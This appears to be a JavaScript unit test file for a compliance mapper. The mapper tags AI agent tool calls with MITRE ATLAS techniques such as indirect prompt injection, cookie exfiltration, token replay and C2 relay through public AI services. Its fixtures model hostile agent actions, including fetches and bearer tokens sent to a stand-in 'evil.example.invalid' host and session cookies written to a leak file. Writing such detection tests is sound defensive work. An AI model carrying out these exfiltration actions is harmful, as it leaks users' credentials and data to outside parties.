// SPDX-License-Identifier: Apache-2.0
// test/unit/compliance/atlas-mapper.test.js
// Per ADR-047 §"Acceptance criteria":
//   - Each of the 7 rules: one true-positive test, one obvious-false-positive test
//   - Catalogue-load failure (missing file) → mapper refuses to start
//   - Decision-logger write failure → annotation is dropped, source event still in chain
//   - Chain-integrity: source event → annotation pair has consistent parentDecisionId
//     and correct M0024 telemetry-context aggregation
//
// We use node:test + node:assert to match the rest of test/unit/**/*.test.js
// and mirror the ast10-mapper.test.js analog. Tests inject a fake audit logger
// (via the auditLogger option) so they do NOT touch /data/audit/decision-chain.jsonl
// on disk — the seam mirrors the pattern documented in the test-driven-development
// skill (`_setXForTest(fake)` on the audit logger).

'use strict';

const { test } = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

// ----------------------------------------------------------------------------
// Helpers
// ----------------------------------------------------------------------------

/**
 * Build a minimal source event of the shape the mapper accepts. Mirrors
 * the DecisionRecord shape from src/audit/decision-logger.js with the
 * minimum fields the rules actually inspect.
 */
function makeEvent(overrides = {}) {
  return {
    decisionId: 'src-' + Math.random().toString(36).slice(2, 10),
    parentDecisionId: null,
    timestamp: '2026-07-14T12:00:00.000Z',
    actor: { agentId: 'agent-1', trustScore: 0.9 },
    action: { type: 'tool_dispatch', target: '/some/file', reason: 'unit-test' },
    context: { pheromoneScores: {}, heuristicWeights: {}, policyId: 'p', policyVersion: '1' },
    outcome: { success: true, latencyMs: 1, errorMessage: null },
    ...overrides
  };
}

/**
 * Fake audit logger that captures logDecision calls and stands in for the
 * real decision-logger module. The mapper accepts it via createATLASMapper({ auditLogger }).
 *
 * `mode`:
 *   - 'capture' (default) — collects every annotation written in mapper.written
 *   - 'throw'            — every logDecision() call throws an Error
 */
function makeFakeAuditLogger(mode = 'capture') {
  const calls = [];
  const written = [];
  return {
    calls,
    written,
    logDecision: async (decision) => {
      calls.push(decision);
      if (mode === 'throw') {
        throw new Error('SIMULATED_DECISION_LOGGER_FAILURE');
      }
      const fakeHash = 'hash-' + written.length.toString(16).padStart(4, '0').repeat(16).slice(0, 64);
      written.push({ decisionId: decision.decisionId, hash: fakeHash, parentDecisionId: decision.parentDecisionId });
      return fakeHash;
    }
  };
}

function makeToolDispatchEvent(overrides = {}) {
  return makeEvent({
    action: { type: 'tool_dispatch', target: '/some/file', reason: 'unit-test', ...(overrides.action || {}) },
    ...overrides
  });
}

function findAnn(annotations, rule) {
  return annotations.find((a) => a.classification && a.classification.rule === rule);
}

// ----------------------------------------------------------------------------
// Catalogue + mapper load — pulled in fresh per test so a busted
// require-cache can't poison the suite.
// ----------------------------------------------------------------------------

const CATALOG_PATH = path.join(__dirname, '../../../src/compliance/atlas-catalog.js');
const MAPPER_PATH  = path.join(__dirname, '../../../src/compliance/atlas-mapper.js');

function loadMapperFresh() {
  // node:test's module cache is per-worker; delete first to be safe.
  delete require.cache[require.resolve(CATALOG_PATH)];
  delete require.cache[require.resolve(MAPPER_PATH)];
  return require(MAPPER_PATH);
}

// ============================================================================
// (1) Catalogue-load failure → mapper refuses to start
// ============================================================================

test('catalogue-load failure: missing catalogPath → createATLASMapper throws ATLAS_CATALOG_UNAVAILABLE', () => {
  const { createATLASMapper } = loadMapperFresh();
  assert.throws(
    () => createATLASMapper({ catalogPath: path.join(os.tmpdir(), 'does-not-exist-' + Date.now() + '.json') }),
    (err) => err.code === 'ATLAS_CATALOG_UNAVAILABLE',
    'expected throw with code ATLAS_CATALOG_UNAVAILABLE'
  );
});

test('catalogue-load failure: empty catalog file → mapper refuses to start (empty array)', () => {
  const tmp = path.join(os.tmpdir(), 'atlas-empty-' + Date.now() + '.json');
  fs.writeFileSync(tmp, '[]');
  try {
    const { createATLASMapper } = loadMapperFresh();
    assert.throws(
      () => createATLASMapper({ catalogPath: tmp }),
      (err) => err.code === 'ATLAS_CATALOG_UNAVAILABLE',
      'expected throw with code ATLAS_CATALOG_UNAVAILABLE'
    );
  } finally {
    fs.unlinkSync(tmp);
  }
});

test('catalogue-load success: bundle catalogue is loadable by default', () => {
  const { createATLASMapper, classify } = loadMapperFresh();
  const mapper = createATLASMapper({ enableWrites: false });
  // Just smoke-test that classify() runs and returns an array.
  const result = classify(mapper, makeToolDispatchEvent());
  assert.ok(Array.isArray(result), 'classify() should return an array');
});

// ============================================================================
// (2) Rule 1: indirect-injection-fetch → AML.T0051.001
//     `event.action.type === 'tool_dispatch'` AND toolId is web_fetch/http_get
//     AND parameters.url's host is NOT in `mapper.config.hostAllowlist`. Confidence H.
// ============================================================================

test('rule indirect-injection-fetch: tool_dispatch web_fetch with non-allowlisted host → AML.T0051.001 H', () => {
  const { createATLASMapper, classify } = loadMapperFresh();
  const mapper = createATLASMapper({ enableWrites: false, hostAllowlist: ['example.com'] });
  const event = makeToolDispatchEvent({
    action: {
      type: 'tool_dispatch',
      toolId: 'web_fetch',
      target: 'https://evil.example.invalid/api',
      parameters: { url: 'https://evil.example.invalid/api' }
    }
  });
  const ann = classify(mapper, event);
  const hit = findAnn(ann, 'indirect-injection-fetch');
  assert.ok(hit, 'must match indirect-injection-fetch');
  assert.ok(hit.matchedTechniques.includes('AML.T0051.001'), 'must include AML.T0051.001');
  assert.strictEqual(hit.classification.confidence, 'H');
});

test('rule indirect-injection-fetch: obvious-false-positive — web_fetch on allowlisted host → no match', () => {
  const { createATLASMapper, classify } = loadMapperFresh();
  const mapper = createATLASMapper({ enableWrites: false, hostAllowlist: ['example.com'] });
  const event = makeToolDispatchEvent({
    action: {
      type: 'tool_dispatch',
      toolId: 'web_fetch',
      target: 'https://example.com/api',
      parameters: { url: 'https://example.com/api' }
    }
  });
  const ann = classify(mapper, event);
  assert.strictEqual(findAnn(ann, 'indirect-injection-fetch'), undefined,
    'must NOT match indirect-injection-fetch when host is allowlisted');
});

// ============================================================================
// (3) Rule 2: multi-turn-baseline-drift → AML.T0054
//     tool_dispatch AND parameters.behavioralBaselineDrift.magnitude >= σ
//     AND trend is monotonic (up or down). UNTUNED defaults: K=5, σ=2.
// ============================================================================

test('rule multi-turn-baseline-drift: tool_dispatch with monotonic drift >= 2σ → AML.T0054 M', () => {
  const { createATLASMapper, classify } = loadMapperFresh();
  const mapper = createATLASMapper({ enableWrites: false, driftK: 5, driftSigma: 2 });
  const event = makeToolDispatchEvent({
    action: {
      type: 'tool_dispatch',
      toolId: 'exec',
      target: '/bin/sh',
      parameters: {
        command: 'ls',
        behavioralBaselineDrift: { magnitude: 3.0, trend: 'up' }
      }
    },
    context: {
      recentDispatches: [
        { magnitude: 0.5, trend: 'up' },
        { magnitude: 1.2, trend: 'up' },
        { magnitude: 2.0, trend: 'up' },
        { magnitude: 2.8, trend: 'up' },
        { magnitude: 3.0, trend: 'up' }
      ]
    }
  });
  const ann = classify(mapper, event);
  const hit = findAnn(ann, 'multi-turn-baseline-drift');
  assert.ok(hit, 'must match multi-turn-baseline-drift');
  assert.ok(hit.matchedTechniques.includes('AML.T0054'), 'must include AML.T0054');
  assert.strictEqual(hit.classification.confidence, 'M');
});

test('rule multi-turn-baseline-drift: obvious-false-positive — magnitude below σ → no match', () => {
  const { createATLASMapper, classify } = loadMapperFresh();
  const mapper = createATLASMapper({ enableWrites: false, driftK: 5, driftSigma: 2 });
  const event = makeToolDispatchEvent({
    action: {
      type: 'tool_dispatch',
      toolId: 'exec',
      target: '/bin/sh',
      parameters: {
        command: 'ls',
        behavioralBaselineDrift: { magnitude: 1.0, trend: 'up' }
      }
    }
  });
  const ann = classify(mapper, event);
  assert.strictEqual(findAnn(ann, 'multi-turn-baseline-drift'), undefined,
    'must NOT match multi-turn-baseline-drift when magnitude < σ');
});

// ============================================================================
// (4) Rule 3: exfil-cookie-parameter → AML.T0113
//     tool_dispatch AND parameters contain cookie/session_id/auth_token keys
//     AND toolId is NOT a network tool. Confidence M.
// ============================================================================

test('rule exfil-cookie-parameter: tool_dispatch with cookie key but non-network tool → AML.T0113 M', () => {
  const { createATLASMapper, classify } = loadMapperFresh();
  const mapper = createATLASMapper({ enableWrites: false });
  const event = makeToolDispatchEvent({
    action: {
      type: 'tool_dispatch',
      toolId: 'file_write',
      target: '/tmp/leak.txt',
      parameters: { cookie: 'session=abc123', other: 'value' }
    }
  });
  const ann = classify(mapper, event);
  const hit = findAnn(ann, 'exfil-cookie-parameter');
  assert.ok(hit, 'must match exfil-cookie-parameter');
  assert.ok(hit.matchedTechniques.includes('AML.T0113'), 'must include AML.T0113');
  assert.strictEqual(hit.classification.confidence, 'M');
});

test('rule exfil-cookie-parameter: obvious-false-positive — cookie key but toolId is network → no match', () => {
  const { createATLASMapper, classify } = loadMapperFresh();
  const mapper = createATLASMapper({ enableWrites: false });
  const event = makeToolDispatchEvent({
    action: {
      type: 'tool_dispatch',
      toolId: 'http_post',
      target: 'https://api.example.com/session',
      parameters: { cookie: 'session=abc123' }
    }
  });
  const ann = classify(mapper, event);
  assert.strictEqual(findAnn(ann, 'exfil-cookie-parameter'), undefined,
    'must NOT match exfil-cookie-parameter when toolId is a network tool');
});

// ============================================================================
// (5) Rule 4: cookie-replay-attempt → AML.T0091.001
//     tool_dispatch AND parameters carry a Cookie/Authorization header AND
//     the request host is NOT in the agent's origin set (hostAllowlist).
//     Confidence M.
// ============================================================================

test('rule cookie-replay-attempt: tool_dispatch with Authorization header to non-allowlisted host → AML.T0091.001 M', () => {
  const { createATLASMapper, classify } = loadMapperFresh();
  const mapper = createATLASMapper({ enableWrites: false, hostAllowlist: ['my-origin.example.com'] });
  const event = makeToolDispatchEvent({
    action: {
      type: 'tool_dispatch',
      toolId: 'http_get',
      target: 'https://evil.example.invalid/api',
      parameters: {
        url: 'https://evil.example.invalid/api',
        headers: { Authorization: 'Bearer leaked-token' }
      }
    }
  });
  const ann = classify(mapper, event);
  const hit = findAnn(ann, 'cookie-replay-attempt');
  assert.ok(hit, 'must match cookie-replay-attempt');
  assert.ok(hit.matchedTechniques.includes('AML.T0091.001'), 'must include AML.T0091.001');
  assert.strictEqual(hit.classification.confidence, 'M');
});

test('rule cookie-replay-attempt: obvious-false-positive — Authorization header but host is allowlisted → no match', () => {
  const { createATLASMapper, classify } = loadMapperFresh();
  const mapper = createATLASMapper({ enableWrites: false, hostAllowlist: ['api.example.com'] });
  const event = makeToolDispatchEvent({
    action: {
      type: 'tool_dispatch',
      toolId: 'http_get',
      target: 'https://api.example.com/v1/sessions',
      parameters: {
        url: 'https://api.example.com/v1/sessions',
        headers: { Authorization: 'Bearer valid-token' }
      }
    }
  });
  const ann = classify(mapper, event);
  assert.strictEqual(findAnn(ann, 'cookie-replay-attempt'), undefined,
    'must NOT match cookie-replay-attempt when host is in allowlist');
});

// ============================================================================
// (6) Rule 5: web-ai-c2-relay → AML.T0114
//     tool_dispatch AND parameters.url's host is in the public-AI-host list.
//     Confidence M. Operators override the list via publicAiHosts.
// ============================================================================

test('rule web-ai-c2-relay: tool_dispatch to public AI host → AML.T0114 M', () => {
  const { createATLASMapper, classify } = loadMapperFresh();
  const mapper = createATLASMapper({ enableWrites: false });
  const event = makeToolDispatchEvent({
    action: {
      type: 'tool_dispatch',
      toolId: 'http_post',
      target: 'https://chat.openai.com/api/message',
      parameters: { url: 'https://chat.openai.com/api/message', prompt: 'leak corporate data' }
    }
  });
  const ann = classify(mapper, event);
  const hit = findAnn(ann, 'web-ai-c2-relay');
  assert.ok(hit, 'must match web-ai-c2-relay');
  assert.ok(hit.matchedTechniques.includes('AML.T0114'), 'must include AML.T0114');
  assert.strictEqual(hit.classification.confidence, 'M');
  // v2026.06 M0024 requires C2-relay indicators — verify the annotation
  // aggregates them in this rule's emission.
  assert.ok(Array.isArray(hit.c2RelayIndicators) && hit.c2RelayIndicators.length >= 1,
    'web-ai-c2-relay annotation must carry c2RelayIndicators');
  assert.strictEqual(hit.c2RelayIndicators[0].kind, 'public-ai-host');
});

test('rule web-ai-c2-relay: obvious-false-positive — tool_dispatch to non-public-AI host → no match', () => {
  const { createATLASMapper, classify } = loadMapperFresh();
  const mapper = createATLASMapper({ enableWrites: false });
  const event = makeToolDispatchEvent({
    action: {
      type: 'tool_dispatch',
      toolId: 'http_post',
      target: 'https://api.example.com/v1/data',
      parameters: { url: 'https://api.example.com/v1/data', prompt: 'normal request' }
    }
  });
  const ann = classify(mapper, event);
  assert.strictEqual(findAnn(ann, 'web-ai-c2-relay'), undefined,
    'must NOT match web-ai-c2-relay when host is not in the public AI list');
});

// ============================================================================
// (7) Rule 6: tool-catalog-known-bad-destination → AML.T0108
//     tool_dispatch AND parameters.knownBadDestination === true OR
//     event.context.toolCatalogDecision === 'BLOCKED_KNOWN_BAD' OR target
//     contains obvious-bad markers. Confidence H.
// ============================================================================

test('rule tool-catalog-known-bad-destination: tool_dispatch with knownBadDestination flag → AML.T0108 H', () => {
  const { createATLASMapper, classify } = loadMapperFresh();
  const mapper = createATLASMapper({ enableWrites: false });
  const event = makeToolDispatchEvent({
    action: {
      type: 'tool_dispatch',
      toolId: 'http_get',
      target: 'https://blocked.example.invalid/api',
      parameters: { knownBadDestination: true }
    }
  });
  const ann = classify(mapper, event);
  const hit = findAnn(ann, 'tool-catalog-known-bad-destination');
  assert.ok(hit, 'must match tool-catalog-known-bad-destination');
  assert.ok(hit.matchedTechniques.includes('AML.T0108'), 'must include AML.T0108');
  assert.strictEqual(hit.classification.confidence, 'H');
});

test('rule tool-catalog-known-bad-destination: obvious-false-positive — clean tool_dispatch → no match', () => {
  const { createATLASMapper, classify } = loadMapperFresh();
  const mapper = createATLASMapper({ enableWrites: false });
  const event = makeToolDispatchEvent({
    action: {
      type: 'tool_dispatch',
      toolId: 'file_read',
      target: '/tmp/normal.log',
      parameters: { path: '/tmp/normal.log' }
    }
  });
  const ann = classify(mapper, event);
  assert.strictEqual(findAnn(ann, 'tool-catalog-known-bad-destination'), undefined,
    'must NOT match tool-catalog-known-bad-destination on a clean tool_dispatch');
});

// ============================================================================
// (8) Rule 7: telemetry-c2-relay-indicator → AML.M0024
//     Not a detector — when ANY rule 1-6 fires on the same event, an
//     additional M0024 annotation is emitted aggregating the C2-relay
//     indicators. Confidence H. Satisfies v2026.06 M0024 "new required
//     fields for C2-relay detection".
// ============================================================================

test('rule telemetry-c2-relay-indicator: fires whenever any rule 1-6 fires, aggregates c2RelayIndicators', () => {
  const { createATLASMapper, classify } = loadMapperFresh();
  const mapper = createATLASMapper({ enableWrites: false });
  // Pick an event that triggers only web-ai-c2-relay (rule 5) — the
  // simplest single-rule scenario, no other rules should fire.
  const event = makeToolDispatchEvent({
    action: {
      type: 'tool_dispatch',
      toolId: 'http_post',
      target: 'https://gemini.google.com/api',
      parameters: { url: 'https://gemini.google.com/api' }
    }
  });
  const ann = classify(mapper, event);
  const m0024 = findAnn(ann, 'telemetry-c2-relay-indicator');
  assert.ok(m0024, 'must match telemetry-c2-relay-indicator when any other rule fires');
  assert.ok(m0024.matchedTechniques.includes('AML.M0024'), 'must include AML.M0024');
  assert.strictEqual(m0024.classification.confidence, 'H');
  // The aggregated c2RelayIndicators come from the upstream web-ai-c2-relay annotation.
  assert.ok(Array.isArray(m0024.c2RelayIndicators) && m0024.c2RelayIndicators.length >= 1,
    'M0024 must aggregate upstream C2-relay indicators');
});

test('rule telemetry-c2-relay-indicator: obvious-false-positive — no rule 1-6 fires → no M0024 emitted', () => {
  const { createATLASMapper, classify } = loadMapperFresh();
  const mapper = createATLASMapper({ enableWrites: false });
  // A clean event that triggers nothing.
  const event = makeToolDispatchEvent({
    action: {
      type: 'tool_dispatch',
      toolId: 'file_read',
      target: '/tmp/normal.log',
      parameters: { path: '/tmp/normal.log' }
    }
  });
  const ann = classify(mapper, event);
  assert.strictEqual(findAnn(ann, 'telemetry-c2-relay-indicator'), undefined,
    'must NOT match telemetry-c2-relay-indicator when no upstream rule fired');
});

// ============================================================================
// (9) Decision-logger write failure → annotation is dropped, source event
//     still in chain. Per ADR-040 / ADR-047 §"Failure modes": never
//     blocks the originating tool call.
// ============================================================================

test('failure mode: decision-logger write failure → annotation dropped, classifyAndLog resolves with empty array', async () => {
  const { createATLASMapper, classifyAndLog } = loadMapperFresh();
  const fake = makeFakeAuditLogger('throw');
  const mapper = createATLASMapper({ enableWrites: true, auditLogger: fake });
  const event = makeToolDispatchEvent({
    action: {
      type: 'tool_dispatch',
      toolId: 'file_write',
      target: '/tmp/leak.txt',
      parameters: { cookie: 'session=leak' }
    }
  });

  // Must not throw — ADR-040 / ADR-047 fail-open contract.
  const written = await classifyAndLog(mapper, event);
  assert.ok(Array.isArray(written), 'returns an array even when audit logger throws');
  assert.strictEqual(written.length, 0, 'nothing should be written when the logger throws');
  assert.strictEqual(fake.written.length, 0, 'fake logger should not have stored any record');
  // Source event MUST still be in the chain — the mapper is READ-ONLY on input.
  assert.ok(event.decisionId && event.decisionId.startsWith('src-'), 'source event is preserved');
});

// ============================================================================
// (10) classifyAndLog with writes enabled — annotation is appended to chain.
// ============================================================================

test('classifyAndLog writes annotation via audit logger when writes enabled', async () => {
  const { createATLASMapper, classifyAndLog } = loadMapperFresh();
  const fake = makeFakeAuditLogger('capture');
  const mapper = createATLASMapper({ enableWrites: true, auditLogger: fake });

  const event = makeToolDispatchEvent({
    action: {
      type: 'tool_dispatch',
      toolId: 'file_write',
      target: '/tmp/leak.txt',
      parameters: { cookie: 'session=leak' }
    }
  });

  const written = await classifyAndLog(mapper, event);
  assert.ok(written.length >= 2, 'should produce exfil-cookie-parameter + telemetry-c2-relay-indicator');
  assert.strictEqual(fake.calls.length, written.length, 'one logDecision call per annotation');

  // Each annotation written must have:
  //   - a fresh decisionId
  //   - parentDecisionId === source event's decisionId
  for (const ann of written) {
    assert.ok(ann.decisionId, 'annotation must have its own decisionId');
    assert.strictEqual(ann.parentDecisionId, event.decisionId,
      'first-pass annotation parentDecisionId must equal source decisionId');
    assert.ok(Array.isArray(ann.matchedTechniques) && ann.matchedTechniques.length > 0);
  }
});

test('classify() with enableWrites=false does NOT touch the audit logger', () => {
  const { createATLASMapper, classify } = loadMapperFresh();
  const fake = makeFakeAuditLogger('capture');
  const mapper = createATLASMapper({ enableWrites: false, auditLogger: fake });

  const event = makeToolDispatchEvent({
    action: {
      type: 'tool_dispatch',
      toolId: 'file_write',
      target: '/tmp/leak.txt',
      parameters: { cookie: 'session=leak' }
    }
  });

  const annotations = classify(mapper, event);
  assert.ok(annotations.length >= 1, 'should still produce annotations without writing');
  assert.strictEqual(fake.calls.length, 0, 'audit logger must NOT be called when enableWrites=false');
});

// ============================================================================
// (11) Chain integrity: source event → annotation pair has consistent
//      parentDecisionId link. Per ADR-047 §"Integration points":
//      annotations link to the source via `parentDecisionId`. Multiple
//      annotations from the same source chain against each other.
// ============================================================================

test('chain integrity: multiple annotations emitted by classifyAndLog chain against the source event', async () => {
  const { createATLASMapper, classifyAndLog } = loadMapperFresh();

  // Real-ish audit logger: captures each decision and chains prevHash.
  let prevHash = 'genesis-' + '0'.repeat(57);
  const stored = [];
  const fakeLogger = {
    logDecision: async (decision) => {
      const hash = 'sha-' + (stored.length + 1).toString().padStart(60, '0');
      decision.hash = hash;
      stored.push({ ...decision, prevHash });
      prevHash = hash;
      return hash;
    }
  };

  const mapper = createATLASMapper({ enableWrites: true, auditLogger: fakeLogger });

  // Trigger rules 3 + 4 + 7: file_write with cookie key to a non-allowlisted
  // host with an Authorization header — exfil-cookie-parameter AND
  // cookie-replay-attempt both fire, plus telemetry-c2-relay-indicator aggregates.
  const sourceId = 'src-test-' + Date.now();
  const event = makeToolDispatchEvent({
    decisionId: sourceId,
    parentDecisionId: null,
    action: {
      type: 'tool_dispatch',
      toolId: 'file_write',
      target: 'https://evil.example.invalid/leak',
      parameters: {
        cookie: 'session=leak',
        Authorization: 'Bearer leaked'
      }
    }
  });
  await classifyAndLog(mapper, event);

  // Every annotation must:
  //   1. have parentDecisionId pointing at the source event
  //   2. chain via prevHash against the previous annotation (when multiple
  //      annotations from the same source exist, they chain to each other)
  assert.ok(stored.length >= 2, `expected ≥ 2 annotations, got ${stored.length}`);
  for (const ann of stored) {
    assert.strictEqual(ann.parentDecisionId, sourceId,
      `annotation ${ann.decisionId} parentDecisionId must equal source ${sourceId}`);
  }
  for (let i = 1; i < stored.length; i++) {
    assert.strictEqual(stored[i].prevHash, stored[i - 1].hash,
      `annotation ${i} must chain against previous annotation's hash`);
  }
});

// ============================================================================
// (12) Defence-in-depth: mapper never mutates the source event.
// ============================================================================

test('classify does not mutate the source event', () => {
  const { createATLASMapper, classify } = loadMapperFresh();
  const mapper = createATLASMapper({ enableWrites: false });
  const event = makeToolDispatchEvent({
    action: {
      type: 'tool_dispatch',
      toolId: 'file_write',
      target: '/tmp/leak.txt',
      parameters: { cookie: 'session=leak' }
    }
  });
  const beforeJson = JSON.stringify(event);
  classify(mapper, event);
  const afterJson = JSON.stringify(event);
  assert.strictEqual(afterJson, beforeJson, 'source event must not be mutated');
});
